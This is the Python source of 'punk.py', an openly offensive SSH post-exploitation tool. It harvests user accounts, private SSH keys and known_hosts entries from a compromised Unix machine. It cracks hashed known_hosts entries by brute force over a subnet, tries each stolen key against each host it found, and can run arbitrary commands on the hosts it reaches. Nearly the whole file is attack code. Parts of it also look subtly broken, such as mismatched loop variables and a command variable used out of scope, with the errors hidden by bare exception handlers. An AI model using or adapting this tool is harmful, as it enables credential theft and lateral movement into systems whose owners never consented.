#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#             |
#          \   |   /
#     .     \  |  /    .
#      `-.__|\/_\/|_.-'
#    .__  \ /     `./  
#       `-        @|
#      .-'`.  !!    -   punk.py - unix SSH post-exploitation 1337 tool
#     '     `  !  __.'  Copyright (C) 2018 < Giuseppe `r3vn` Corti >
#           _)___(      https://xfiltrated.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import sys
import threading
import argparse
import base64
import hashlib
import re
import socket
import struct
import hmac
import binascii

try: 
    import queue as queue
except ImportError:
    import Queue as queue


homesBlacklist = ["/dev/null","/var/empty","/bin","/sbin"]
shellBlacklist = ["/sbin/nologin","/bin/false","/usr/sbin/nologin","/bin/sync"]
knownHosts     = []
success        = []
users          = []
sshKeys        = []

   
class SSHThread(threading.Thread) :
 
	def __init__(self, q, tid, credentials, CMD="") :
		threading.Thread.__init__(self)
		self.queue = q
		self.tid = tid
		self.credentials = credentials
 
	def run(self) :
		while True :
			host = None 
			try :
				host = self.queue.get(timeout=1)
 
			except 	queue.Empty :
				return
 
			
			for user in users:
				for keys in sshKeys:
					try:
						if int(os.system("ssh -oBatchMode=yes -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oConnectTimeout=8 %s@%s -i %s -q exit" % (user,host,key ))) == 0:
							self.credentials.put(user+":"+host+":"+key)

							if user+":"+host+":"+key not in success:
								sys.stdout.write ("\033[92m[*]\033[0m Got \033[92m%s@%s\033[0m with \033[92m\"%s\"\033[0m key.\n" % (user,host,key))
								success.append(user+":"+host+":"+key)
							
							if CMD != '':
								sys.stdout.write ("\033[92m[*]\033[0m Executing \033[92m%s\033[0m.\n" % (CMD))
								os.system("ssh -oBatchMode=yes -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oConnectTimeout=8 %s@%s -i %s -q -t \"%s\" " % (user,host,key,CMD))
					except:
						pass
 
 
			self.queue.task_done()


class CrackThread(threading.Thread) :
 
	def __init__(self, q, tid, ips, magic, salt, hashed) :
		threading.Thread.__init__(self)
		self.queue  = q
		self.tid    = tid
		self.ips    = ips
		self.magic  = magic
		self.salt   = base64.b64decode(salt)
		self.hashed = hashed

 
	def run(self) :
		while True :
			host = None 
			try :
				ip_try = self.queue.get(timeout=1)
 
			except 	queue.Empty :
				return


			h = hmac.new(self.salt, msg=ip_try.encode(), digestmod=hashlib.sha1) # FIXME
			ip_hash = base64.b64encode(h.digest()).decode()


			if ip_hash == self.hashed:
				knownHosts.append(ip_try)
				sys.stdout.write ("\033[92m[*]\033[0m Found \033[92m%s\033[0m\n" % (ip_try))

			#sys.stdout.write ("\n-----\nip: "+ip_try+"\n salt: "+self.salt.decode()+"\n output: "+ip_hash+"\ntarget: "+self.hashed)

			self.queue.task_done()


class attack(object):

	def __init__(self, cmd, threads):
		self.cmd = cmd
		self.threads = threads

	def run(self):

		q           = queue.Queue()
		credentials = queue.Queue()

		threads = []
		for i in range(1, self.threads) : # Number of threads
			worker = SSHThread(q, i, credentials, self.cmd) 
			worker.setDaemon(True)
			worker.start()
			threads.append(worker)

		for host in knownHosts:
			q.put(host)

		q.join()
		 
		# wait for all threads to exit 
		if not credentials.empty():
			out = (credentials.get()).split(":")
		else:
			return False
		 
		for item in threads :
			item.join()

		return out[0], out[1] # Output attack: user, host





class crack_host(object):

	def __init__(self, host_string, subnet, threads):
		""" crack an encrypted known host """

		self.magic   = host_string.split("|")[1]
		self.salt    = host_string.split("|")[2]
		self.hashed  = host_string.split("|")[3].split(" ")[0]
		self.subnet  = subnet # TODO
		self.threads = threads

	def run(self):

		q           = queue.Queue()
		ips         = queue.Queue()

		threads = []
		for i in range(1, self.threads) : # Number of threads
			worker = CrackThread(q, i, ips, self.magic, self.salt, self.hashed) 
			worker.setDaemon(True)
			worker.start()
			threads.append(worker)

		for host in ipv4_range(self.subnet): # TODO
			q.put(str(host))              # TODO

		q.join()
		 
		# wait for all threads to exit 
		if not ips.empty():
			out = (ips.get()).split(":")
		else:
			return False
		 
		for item in threads :
			item.join()

		return out[0], out[1] # Output attack: user, host

def discovery(args):
	# Search users, SSH keys and known hosts

	if args.passwd:
		# Get users and home paths from passwd
		F = open("/etc/passwd",'r')

		for line in F:
			if not line.startswith('#'): # skip comments

				user  = line.split(":")[0]
				home  = line.split(":")[5]
				shell = line.split(":")[6].replace("\n","")

				if home not in homesBlacklist and shell not in shellBlacklist:

					users.append(user)

					#collect known hosts
					if os.path.isfile(home + "/.ssh/known_hosts"):
						FK = open(home + "/.ssh/known_hosts")
						encrypted_knownhosts = False

						for host in FK:
							if not host.find("|") >= 0: # secure known_hosts
								if host.find(",") >= 0:
									hostname = host.split(" ")[0].split(",")[1]
								else:
									hostname = host.split(" ")[0]
								if hostname not in knownHosts:
									knownHosts.append(hostname)
							else:
								encrypted_knownhosts = True
									

						if encrypted_knownhosts and args.crack == "":
							sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s/.ssh/known_hosts\033[0m\n" % home )
							sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m--crack\033[0m flag to break it\n")

						elif encrypted_knownhosts and args.crack != "":
							# crack the hashed known hosts
							sys.stdout.write ("\033[92m[*]\033[0m Cracking known hosts on \033[92m%s/.ssh/known_hosts...\033[0m\n" % home )
							FK = open(home + "/.ssh/known_hosts")
							for host in FK:
								if host.find("|") >= 0:
									crack_obj = crack_host(host, args.crack, args.threads)
									crack_obj.run()
							#sys.stdout.write ("\033[92m[*]\033[0m Cracking done.\n")

						FK.close()

					# check users with private keys
					if os.path.isfile(home + "/.ssh/id_rsa"): 
						#targets[user]=home + "/.ssh/id_rsa"  # username and home dir
						if home+"/.ssh/id_rsa" not in sshKeys:
							sshKeys.append(home + "/.ssh/id_rsa")
		F.close()

	# home directory scan
	for homes in os.listdir(args.home):
		if homes not in users:

			users.append(homes)

			if os.path.isfile(args.home+homes + "/.ssh/id_rsa"):
				#targets[homes] = homes + "/.ssh/id_rsa"
				if args.home+homes + "/.ssh/id_rsa" not in sshKeys:
					sshKeys.append(args.home+homes + "/.ssh/id_rsa")

			if os.path.isfile(args.home+homes + "/.ssh/known_hosts"):
				FK = open(args.home+homes + "/.ssh/known_hosts")
				encrypted_knownhosts = False

				for host in FK:
					if not host.find("|") >= 0: # secure known_hosts
						if host.find(",") >= 0:
							hostname = host.split(" ")[0].split(",")[1]
						else:
							hostname = host.split(" ")[0]
						if hostname not in knownHosts:
							knownHosts.append(hostname)
					else:
						encrypted_knownhosts = True


				if encrypted_knownhosts and args.crack == "":
					sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s/.ssh/known_hosts\033[0m\n" % args.home )
					sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m%s--crack\033[0m flag to break it\n")

				elif encrypted_knownhosts and args.crack != "":
					# crack the hashed known hosts
					sys.stdout.write ("\033[92m[*]\033[0m Cracking known hosts on \033[92m%s/.ssh/known_hosts...\033[0m\n" % args.home )
					open(args.home+homes + "/.ssh/known_hosts")
					for host in FK:
						if host.find("|") >= 0:
							crack_obj = crack_host(host, args.crack, args.threads)
							crack_obj.run()

				FK.close()
	
	return True

# Avoid ipaddress library since is not supported in python2 
# https://stackoverflow.com/a/41386874
def inet_atoi(ipv4_str):
    """Convert dotted ipv4 string to int"""
    # note: use socket for packed binary then struct to unpack
    return struct.unpack("!I", socket.inet_aton(ipv4_str))[0]

def inet_itoa(ipv4_int):
    """Convert int to dotted ipv4 string"""
    # note: use struct to pack then socket to string
    return socket.inet_ntoa(struct.pack("!I", ipv4_int))

def ipv4_range(ipaddr):
    """Return a list of IPv4 address contianed in a cidr address range"""
    # split out for example 192.168.1.1:22/24
    ipv4_str, port_str, cidr_str = re.match(
        r'([\d\.]+)(:\d+)?(/\d+)?', ipaddr).groups()

    # convert as needed
    ipv4_int = inet_atoi(ipv4_str)
    port_str = port_str or ''
    cidr_str = cidr_str or ''
    cidr_int = int(cidr_str[1:]) if cidr_str else 0

    # mask ipv4
    ipv4_base = ipv4_int & (0xffffffff << (32 - cidr_int))

    # generate list
    addrs = [inet_itoa(ipv4_base + val)
        for val in range(1 << (32 - cidr_int) + 2)]
    return addrs


if __name__ == "__main__":

	sys.stdout.write ("""\033[92m
             |
         \   |   /
    .     \  |  /    .
     `-.__|\/_\/|_.-'
   .__  \ /     `./  
      `-        @|
     .-'`.  !!    -   \033[90m-=[ \033[93mpunk.py - unix SSH post-exploitation 1337 tool\033[92m
    '     `  !  __.'  \033[90m-=[ \033[93mby `r3vn` ( tw: @r3vnn )\033[92m
          _)___(      \033[90m-=[ \033[93mhttps://xfiltrated.com\033[92m
        \n\033[0m""")


	parser = argparse.ArgumentParser()
	parser.add_argument('--home', help='custom home path',default="/home/")
	parser.add_argument('--run','-r', help='run commands on compromised hosts',default="")
	parser.add_argument('--no-passwd', dest='passwd', action='store_false', default=True, help='skip passwd check')
	parser.add_argument('--crack','-c', help='crack hashed known_hosts files',default="",metavar='subnet')
	parser.add_argument('--threads','-t', type=int, help='brute-focing threads',default=4)
	args = parser.parse_args()

	sys.stdout.write ("\033[92m[*]\033[0m enumerating valid users with ssh keys...\n")
	discovery(args)
	sys.stdout.write ("\033[92m[*]\033[0m Done.\n")

	if len(sshKeys) <= 0:
		sys.stdout.write ("\033[93m[!]\033[0m No valid SSH keys found on the system.\n")
		sys.exit()
	else:
		sys.stdout.write ("\033[92m[*]\033[0m SSH keys found:\n\033[92m\n")

		for key in sshKeys:
			sys.stdout.write ("\t" + key + "\n")

	if len(users) <= 0:
		sys.stdout.write ("\n\033[93m[!]\033[0m No valid users found on the system.\n")
		sys.exit()
	else:
		sys.stdout.write ("\n\033[92m[*]\033[0m Users found:\n\033[92m\n")

		for user in users:
			sys.stdout.write ("\t" + user + "\n" )#+ " :: " + targets[user]

	if len(knownHosts) <= 0:
		sys.stdout.write ("\n\033[93m[!]\033[0m No valid known hosts found on the system.\n")
		sys.exit()

	else:
		sys.stdout.write ("\n\033[92m[*]\033[0m known hosts found:\n\033[92m\n")

		for host in knownHosts:
			sys.stdout.write ("\t"+ host+ "\n")

	sys.stdout.write ("\n\033[92m[*]\033[0m Starting keys bruteforcing...\n")
	Attack = attack(args.run, args.threads)

	Attack.run()
	sys.stdout.write ("\033[92m[*]\033[0m Attack Complete!\n")



		

